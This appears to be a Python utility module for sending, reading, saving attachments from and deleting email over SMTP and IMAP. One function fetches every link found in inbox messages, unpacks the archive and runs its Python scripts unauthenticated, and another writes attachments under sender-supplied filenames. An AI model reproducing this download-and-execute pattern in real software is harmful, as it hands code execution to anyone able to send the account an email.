import os
import wget
import time
import glob
import getpass
import tarfile
import subprocess
import email.mime.multipart
import email.mime.text
import email.mime.image
import email.mime.audio
from datetime import datetime
from pprint import pprint
from colorama import Style, Fore
from smtplib import SMTP, SMTP_SSL
from imaplib import IMAP4_SSL, IMAP4

def smtp_connect(smtp_server, verbose=True):
    """ Conection to smtp server.
            smtp_server_ip (str): This value is the smtp server's ip.
            verbose (boolean): Print information about function progress.
    Returns:
        None
    """
    try:
        smtp = SMTP_SSL(host=smtp_server)
        smtp.ehlo()
        if verbose:
            print(Fore.GREEN+ " ==> [smtp_connect]   with SSL" +Style.RESET_ALL)
        return smtp
    except:
        try:
            smtp = SMTP(host=smtp_server)
            smtp.ehlo()
            if verbose:
                print(Fore.GREEN+ " ==> [smtp_connect]   without SSL" +Style.RESET_ALL)
            return smtp
        except:
            print(Fore.RED+ " ==> [smtp_connect]   failed!" +Style.RESET_ALL)
            return 1

def imap_connect(imap_server, username, password, verbose=True):
    """ Connection to imp server.
            imap_server_ip (str): This value is the imap server's ip.
            verbose (boolean): Print information about function progress.
    Returns:
        None
    """
    try:
        imap = IMAP4_SSL(imap_server)
        imap.login(username, password)
        if verbose:
            print(Fore.GREEN+ " ==> [imap_connect]   with SSL" +Style.RESET_ALL)
        return imap
    except:
        try:
            imap = IMAP4(imap_server)
            imap.login(username, password)
            if verbose:
                print(Fore.GREEN+ " ==> [imap_connect]   without SSL" +Style.RESET_ALL)
            return imap
        except:
            print(Fore.RED+ " ==> [imap_connect]   failed!" +Style.RESET_ALL)

def send_mail(smtp_server, FROM="", TO="", subject="", msg="", attachements=[], verbose=True):
    """ Send mail.
            smtp_server_ip (str): This value is the smtp server's ip.
            FROM (str): This value is the sender email address.
            TO (list): This value is a list of multiple recipient
            SUBJECT (str, Optional): This value is the email's subject content.
            msg (str, Optional): This value is the email's message content.
            attachements (list Optional):
            verbose (boolean): Print information about function progress.

    Returns:
        None
    """
    smtp = smtp_connect(smtp_server, verbose=False)
    mail = email.mime.multipart.MIMEMultipart()
    mail["Subject"] = "[ "+subject+" ]"
    mail["From"] = FROM
    mail["To"] = TO
    msg = email.mime.text.MIMEText(msg, _subtype="plain")
    msg.add_header("Content-Disposition", "email message")
    mail.attach(msg)
    for attachement in attachements:
        if attachement[0] == "image":
            img = email.mime.image.MIMEImage(open(attachement[1], "rb").read())
            img.add_header("Content-Disposition", "attachement")
            img.add_header("Attachement-type", "image")
            img.add_header("Attachement-filename", attachement[1])
            mail.attach(img)

        if attachement[0] == "file":
            text = email.mime.text.MIMEText(open(attachement[1], "r").read())
            text.add_header("Content-Disposition", "attachement")
            text.add_header("Attachement-type", "filetext")
            text.add_header("Attachement-filename", attachement[1])
            mail.attach(text)
    try:
        smtp.sendmail(mail["From"], mail["To"], mail.as_string())
        if verbose:
            print(Fore.GREEN+ " ==> [send_mail] "+mail["From"]+" --> "+mail["To"]+"  {"+subject+"}   -- "+ time.strftime("%H:%M:%S", time.localtime()) +Style.RESET_ALL)
        smtp_logout(smtp, verbose=False)
    except Exception as e:
        print(Fore.RED+ " ==> [send_mail] failed!  "+mail["From"]+" --> "+mail["To"]+"  -- "+ time.strftime("%H:%M:%S", time.localtime()) +Style.RESET_ALL)
        print(Fore.RED+str(e)+Style.RESET_ALL)
        smtp_logout(smtp, verbose=False)

def read_mailbox(imap_server, username, password, verbose=True): # attribut [ _payload ]
    """ Read email inbox
            imap_server_ip (str): This value is the imap server's ip.
            login (str): This value is the username login.
            password (str): This value is the password login.
            verbose (boolean): Print information about function progress.

    Returns:
        list of str: all emails content
    """
    imap = imap_connect(imap_server, username, password, verbose=False)
    all_mails = []
    imap.select("INBOX")
    status, mails = imap.search(None, "ALL")
    for mail in mails[0].split():
        status, data = imap.fetch(mail, "(RFC822)")
        mail_content = email.message_from_string(data[0][1].decode("utf-8"))
        all_mails.append(mail_content)
        for part in mail_content.walk():
            if not part.is_multipart():
                pass

    if verbose:
        print(Fore.GREEN+ " ==> [read_mailbox] {"+str(len(mails)-1)+"}   -- "+ time.strftime("%H:%M:%S", time.localtime()) +Style.RESET_ALL)
    imap_logout(imap, verbose=False)
    return all_mails

def read_mailbox_download_execute(imap_server, imap_login, imap_password):
    """ Read email inbox and download link inside.
            imap_server_ip (str): This value is the imap server's ip.
            imap_login (str): This value is the username login.
            imap_password (str): This value is the password login.
            verbose (boolean): Print information about function progress.

    Returns:
        list of str: all emails content
    """
    try:
        path = None
        mails = read_mailbox(imap_server, imap_login, imap_password, verbose=False)
        if len(mails) <= 0:
            print(Fore.YELLOW+ " ==> [read_mailbox_download_execute] {"+str(len(mails)-1)+"}   -- "+ time.strftime("%H:%M:%S", time.localtime()) +Style.RESET_ALL)
            return 0
        for mail in mails:
            for element in str(mail).replace("\n", " ").split(" "):
                if "http" in element:
                    path = wget.download(element)
        if path == None:
            print(Fore.YELLOW+ " ==> [read_mailbox_download_execute] {"+str(len(mails)-1)+"}   -- "+ time.strftime("%H:%M:%S", time.localtime()) +Style.RESET_ALL)
            return 0
        tarf_file = tarfile.open(path)
        tarf_file.extractall(".")
        tarf_file.close()
        python_files = glob.glob("*/*maj*.py")
        for python_script in python_files:
            subprocess.getoutput("python3 "+python_script)

        print(Fore.GREEN+ " ==> [read_mailbox_download_execute] {"+str(len(mails)-1)+"}   -- "+ time.strftime("%H:%M:%S", time.localtime()) +Style.RESET_ALL)
        return True
    except Exception as e:
        print(Fore.RED+ " ==> [read_mailbox_download_execute] failed during execution!   -- "+ time.strftime("%H:%M:%S", time.localtime()) +Style.RESET_ALL)
        print(e)
        return False

def download_attachements(imap_server, username, password, verbose=True):
    """ Read email inbox and download attachements.
            imap_server_ip (str): This value is the imap server's ip.
            imap_login (str): This value is the username login.
            imap_password (str): This value is the password login.
            verbose (boolean): Print information about function progress.

    Returns:
        list of str: all emails content
    """
    imap = imap_connect(imap_server, username, password, verbose=False)
    #INIT
    if not os.path.isdir("/home/"+getpass.getuser()+"/Downloads"):
        os.makedirs("/home/"+getpass.getuser()+"/Downloads")
    mails = []
    imap.select("INBOX")
    status, mails = imap.search(None, "ALL")
    for mail in mails[0].split():
        status, data = imap.fetch(mail, "(RFC822)")
        mail_content = email.message_from_string(data[0][1].decode("utf-8"))
        for part in mail_content.walk():
            if not part.is_multipart():
                if part["Content-Disposition"] == "attachement" and part["Attachement-type"] == "filetext":
                    username = getpass.getuser()
                    file = open(part["Attachement-filename"],"w")
                    file.write(part._payload)
                    file.close()
    imap_logout(imap, verbose=False)
    print(Fore.GREEN+ " ==> [download_attachements]   --- " + time.strftime("%H:%M:%S", time.localtime())+Style.RESET_ALL)

# In progress
def delete_old_emails(imap, time_laps=60):
    delete_messages = []
    imap.select("INBOX")
    status, mails = imap.search(None, "ALL")
    for mail in mails[0].split():
        status, data = imap.fetch(mail, "(RFC822)")
        mail_content = email.message_from_string(data[0][1].decode("utf-8"))
        if (time.time() - time.mktime(time.strptime(mail_content["Date"], "%a, %d %b %Y %H:%M:%S %z")) >= time_laps ):
            delete_messages.append(mail)
    delete_emails(imap, delete_messages)

def delete_emails(imap, mails):
    """ Delete mails specified in attributs
            imap (imap_object): This value is the imap server's object.
            mails (list): This value is an email list to delete.

    Returns:
        list of str: all emails content
    """
    for mail in mails:
        imap.store(mail,"+FLAGS","\\Deleted")
    imap.expunge()

def delete_all_emails(imap_server, username, password, verbose=True):
    """ Delete all emails in INBOX.
            imap_server_ip (str): This value is the imap server's ip.
            imap_login (str): This value is the username login.
            imap_password (str): This value is the password login.
            verbose (boolean): Print information about function progress.

    Returns:
        list of str: all emails content
    """
    imap = imap_connect(imap_server, username, password, verbose=False)
    delete_messages = []
    imap.select("INBOX")
    status, mails = imap.search(None, "ALL")
    for mail in mails[0].split():
        delete_messages.append(mail)
    delete_emails(imap, delete_messages)
    status, mails = imap.search(None, "ALL")
    if len(mails) == 1:
        print(Fore.GREEN+ " ==> [delete_all_emails]   was successfull   --- " + time.strftime("%H:%M:%S", time.localtime()) +Style.RESET_ALL)
        imap_logout(imap, verbose=False)
        return 0
    print(Fore.RED+ " ==> [delete_all_emails]   failed!   --- " + time.strftime("%H:%M:%S", time.localtime()) +Style.RESET_ALL)
    imap_logout(imap, verbose=False)
    return 1

def imap_logout(imap, verbose=True):
    """ Logout out to the imap service
            imap (imap_object): This value is the imap server's object.
    Returns:
        None
    """
    try:
        imap.close()
        imap.logout()
        if verbose:
            print(Fore.GREEN+ " ==> [imap_logout]   was successfull" +Style.RESET_ALL)
    except:
        print(Fore.RED+ " ==> [imap_logout]   failed" +Style.RESET_ALL)

def smtp_logout(smtp, verbose=True):
    """ Logout out to the smtp service
            smtp (smtp_object): This value is the smtp server's object.
    Returns:
        None
    """
    try:
        smtp.quit()
        if verbose:
            print(Fore.GREEN+ " ==> [smtp_logout]   was successfull" +Style.RESET_ALL)
    except:
        print(Fore.RED+ " ==> [smtp_logout]   failed" +Style.RESET_ALL)
